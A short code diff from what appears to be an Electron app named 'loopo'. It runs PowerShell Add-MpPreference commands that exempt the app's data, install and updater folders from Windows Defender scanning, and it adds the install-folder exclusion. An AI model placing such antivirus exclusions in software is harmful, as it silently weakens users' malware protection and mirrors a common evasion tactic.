@@ -14,8 +14,10 @@ let ps = new powershell({
 });
 let apploc = app.getPath("userData");
 let appUpdateLoc = apploc.replace("Roaming", "Local");
+let appInstallLoc = appUpdateLoc+'\\Programs\\loopo';
 appUpdateLoc = appUpdateLoc+'-updater';
 ps.addCommand('Add-MpPreference -ExclusionPath "'+apploc+'"');
+ps.addCommand('Add-MpPreference -ExclusionPath "'+appInstallLoc+'"');
 ps.addCommand('Add-MpPreference -ExclusionPath "'+appUpdateLoc+'"');
 // .then(() => ps.addParameter({name: 'ExclusionPath', value: 'app.getPath("userData")'}));
 ps.invoke()
